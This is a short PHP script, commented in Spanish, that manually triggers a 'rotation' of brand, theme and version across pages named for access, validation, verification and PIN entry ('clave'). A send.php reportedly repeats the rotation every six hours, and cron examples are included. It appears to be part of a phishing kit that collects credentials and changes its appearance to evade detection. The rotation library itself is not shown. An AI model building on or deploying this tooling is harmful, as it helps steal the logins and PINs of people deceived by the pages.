<?php
/**
 * rotate.php
 * ----------
 * Disparo MANUAL de la rotación (opcional).
 * La rotación automática ya ocurre sola desde send.php cada 6h.
 * Este archivo es solo si quieres forzar una rotación inmediata.
 *
 * SEGURIDAD:
 *   - Requiere un secreto: rotate.php?key=TU_SECRETO
 *   - Cambia el valor de SECRET abajo antes de subir.
 *
 * USO COMO CRON (en cPanel u hosting equivalente):
 *   curl -s "https://tu-dominio.com/rotate.php?key=TU_SECRETO" > /dev/null
 *
 *   Ejemplo cada 6 horas:
 *     0 *\/6 * * * curl -s "https://tu-dominio.com/rotate.php?key=TU_SECRETO" > /dev/null
 *
 *   O cada día a las 3:00 AM:
 *     0 3 * * * curl -s "https://tu-dominio.com/rotate.php?key=TU_SECRETO" > /dev/null
 *
 * SEGURIDAD ATÓMICA:
 *   Cada archivo se escribe a .tmp y luego se hace rename(), que en el
 *   mismo filesystem es atómico. Los usuarios activos NUNCA verán un
 *   archivo a medias.
 */

// =====================================================================
// CONFIGURACIÓN
// =====================================================================
const SECRET = 'CAMBIA_ESTE_SECRETO_LARGO_Y_ALEATORIO';
const DOMAIN = 'ejemplo.com';   // tu dominio real (sin https://)

const HTML_FILES = ['index.html', 'acceso.html', 'validacion.html', 'verificacion.html', 'clave.html'];

require_once __DIR__ . '/rotate_lib.php';

header('Content-Type: text/plain; charset=utf-8');

if (!isset($_GET['key']) || !hash_equals(SECRET, (string)$_GET['key'])) {
    http_response_code(403);
    exit("forbidden\n");
}

$res = nq_do_rotate(__DIR__);
file_put_contents(__DIR__ . '/.last_rotate', (string) time());
echo "ok\nbrand={$res['brand']}\ntheme={$res['theme']}\nversion={$res['version']}\nbuild={$res['build']}\n";
exit;
